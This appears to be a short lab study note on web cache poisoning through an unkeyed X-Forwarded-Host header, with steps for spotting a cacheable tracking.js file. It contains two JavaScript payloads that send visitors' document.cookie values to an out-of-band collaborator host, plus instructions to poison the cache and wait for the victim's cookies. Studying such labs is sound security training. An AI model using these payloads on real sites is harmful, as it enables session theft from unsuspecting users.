___

Watch for `/resources/js/tracking.js` file and `X-Cache: hit` header in response.
If you got only tracking.js without X-Cache - no cache poisoning here.

![[Pasted image 20240808103007.png]]

If you got both file and header, the first thing you should try is to inject your exploit server into **Host:** or **X-Forwarded-Host:** headers and check them in response

![[Pasted image 20240808103015.png]]

You got the poisoned cache with X-Forwarded-Host? Cool, now go to your exploit server, set the File name /resources/js/tracking.js and in Body section paste the next payload: `document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')`. Poison web cache with your server and wait for victim's cookies.

```js
document.location='https://OASTIFY.COM/?cookies='+document.cookie;
```

# Web cache poisoning with an unkeyed header

